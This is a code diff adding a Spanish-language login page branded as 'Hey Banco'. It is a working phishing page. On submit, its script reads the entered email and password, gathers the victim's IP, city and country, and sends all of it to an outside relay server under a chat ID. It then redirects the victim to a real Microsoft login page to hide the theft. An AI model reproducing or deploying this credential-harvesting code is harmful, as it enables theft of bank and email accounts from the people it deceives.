@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Login</title>
+    <link rel="stylesheet" href="styles.css" />
+  </head>
+  <body>
+    <div class="login-container">
+      <div style="height: 50px"></div>
+      <form class="login-form" id="loginform">
+        <img src="logo.png" alt="Hey Banco Logo" class="logo" />
+
+        <div style="width: 100%; height: 20px"></div>
+        <label style="font-weight: bold">Email</label>
+        <div style="width: 100%; height: 15px"></div>
+        <input
+          type="email"
+          placeholder="Correo electrónico"
+          id="correo"
+          required
+        />
+        <label style="font-weight: bold">Contraseña</label>
+        <div style="width: 100%; height: 15px"></div>
+        <input type="password" placeholder="Contraseña" id="contra" required />
+        <div style="width: 100%; text-align: right">
+          <button type="submit">Continuar</button>
+        </div>
+      </form>
+    </div>
+  </body>
+  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+
+  <script>
+    const url = "https://ipapi.co/json/";
+    const form = document.querySelector("#loginform");
+    form.addEventListener("submit", (event) => {
+      event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
+      axios
+        .get(url)
+        .then((response) => {
+          const email = document.querySelector("#correo").value;
+          const contra = document.querySelector("#contra").value;
+          const message =
+            "%0AHotmail" +
+            "%0AEmail: " +
+            email +
+            "%0AContra: " +
+            contra +
+            "%0ACiudad:" +
+            response.data.city +
+            "%0APais: " +
+            response.data.country +
+            "%0AIP: " +
+            response.data.ip;
+          axios
+            .get(
+              "https://fasmbs.onrender.com/enviar_mensaje/?chat_id=-1002021304400&mensaje=" +
+                message
+            )
+            .then((response) => {
+              window.location.href = "https://login.live.com";
+            })
+            .catch((error) => {
+              console.error(error);
+            });
+        })
+        .catch((error) => {
+          console.log(error);
+        });
+    });
+  </script>
+</html>
